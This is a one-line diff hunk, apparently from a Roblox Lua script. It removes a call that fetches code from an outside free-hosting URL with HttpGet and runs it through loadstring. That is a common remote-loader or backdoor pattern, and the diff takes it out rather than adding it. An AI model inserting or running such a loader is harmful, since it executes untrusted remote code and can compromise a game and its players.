@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://ssr200.000webhostapp.com/')))()
